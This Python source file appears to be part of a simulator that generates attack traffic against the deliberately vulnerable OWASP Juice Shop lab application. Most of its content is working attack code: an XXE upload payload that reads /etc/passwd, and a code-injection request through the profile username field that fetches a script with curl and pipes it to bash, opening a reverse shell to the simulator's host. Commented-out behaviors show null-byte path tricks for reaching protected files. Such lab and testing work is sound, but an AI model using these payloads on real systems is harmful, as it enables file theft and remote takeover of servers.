import asyncio
import os
import random

from bs4 import BeautifulSoup
from loguru import logger

import random_utils
from attacks_utils import dirsearch, reverse_shell
from behaviors import Behaviors, States, define_behavior
from config import settings
from providers import http
from user import user_manager
from utils import sleep


# @define_behavior(
#     Behaviors.get_ftp_file,
#     weight=0.05,
#     is_attack=True,
# )
# async def get_ftp_file() -> None:
#     await http.client.get("/ftp")
#     secrets = [
#         "/ftp/acquisitions.md",
#         "/ftp/package.json.bak%2500.md",
#         "/ftp/coupons_2013.md.bak%2500.md",
#         "/ftp/suspicious_errors.yml%2500.md",
#     ]
#     await http.client.get(random.choice(secrets))


# @define_behavior(
#     Behaviors.get_prometheus,
#     weight=0.05,
#     is_attack=True,
# )
# async def get_prometheus() -> None:
#     await http.client.get("/metrics")


@define_behavior(
    Behaviors.file_read,
    weight=0.05,
    avaliable_states=[States.logged_in],
    is_attack=True,
)
async def arbitary_file_read() -> None:
    await user_manager.whoami()
    await sleep(random.randint(60, 90))

    template = """<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file://{}" >]>

<trades>
    <metadata>
        <name>Apple Juice</name>
        <trader>
            <foo>&xxe;</foo>
            <name>B. Kimminich</name>
        </trader>
        <units>1500</units>
        <price>106</price>
        <name>Lemon Juice</name>
        <trader>
            <name>B. Kimminich</name>
        </trader>
        <units>4500</units>
        <price>195</price>
    </metadata>
</trades>"""
    upload_file = template.format(
        random.choice(
            [
                "/etc/passwd",
                "/etc/hosts",
                "/dev/random",
            ]
        )
    )
    await http.client.post(
        "/file-upload",
        files={"file": (f"{random_utils.random_string()}.xml", upload_file)},
    )

    content = {
        "UserId": user_manager.user.id,
        "message": random_utils.random_string((50, 160)),
    }
    await http.post_api("/api/Complaints", json=content)
    await user_manager.whoami()


# @define_behavior(
#     Behaviors.dirsearch,
#     weight=0.05,
#     is_attack=True,
# )
# async def dir_search() -> None:
#     asyncio.create_task(dirsearch.dirsearch())


@define_behavior(
    Behaviors.js_code_exec,
    weight=0.05,
    avaliable_states=[States.logged_in],
    is_attack=True,
)
async def js_code_exec() -> None:
    os.makedirs("assets/tmp", exist_ok=True)
    with open("assets/tmp/shell.sh", "w") as f:
        f.write(f"bash -i >& /dev/tcp/{settings.self_host}/8888 0>&1")

    code = f"global.process.mainModule.require('child_process').execSync('curl {settings.self_host}:8000/tmp/shell.sh | bash; echo Hacked')"
    await http.client.post("/profile", data={"username": "#{" + code + "}"})
    res = await http.client.get("/profile")
    soup = BeautifulSoup(res.text)
    username_elem = soup.select_one("#card > div > div:nth-child(2) > p")
    assert username_elem, "Cannot find username element"
    result = username_elem.text
    logger.info(f"js_code_exec result: {result}")
